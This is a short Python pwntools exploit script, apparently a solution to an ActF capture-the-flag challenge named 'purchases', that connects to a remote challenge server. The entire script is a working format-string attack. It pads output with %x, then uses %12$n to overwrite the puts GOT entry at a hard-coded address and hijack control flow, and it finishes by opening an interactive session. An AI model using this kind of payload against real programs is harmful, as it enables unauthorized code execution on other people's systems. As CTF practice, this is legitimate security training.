#!/usr/bin/env python

from pwn import *

# This will be explained
PUTS_GOT_ADDR_PADDED = 0x61404018

JUNK = "b" * 8

def recv_response(p):
    r = p.recvrepeat(1.0)
    print "[+] Response: " + r
    return r

p = remote("shell.actf.co", 19011)
# p = process("./purchases")

recv_response(p)

# %56x%x%x%x.%10$pbbbbbbbbcccccccc

buf = "%4198790x"
buf += "%x." * 3
buf += "%x" * 4
buf += ".%12$n"
buf += p64(PUTS_GOT_ADDR_PADDED)

print "[+] Buf len: " + str(len(buf))

# gdb.attach(p)

p.sendline(buf)

recv_response(p)

p.interactive()
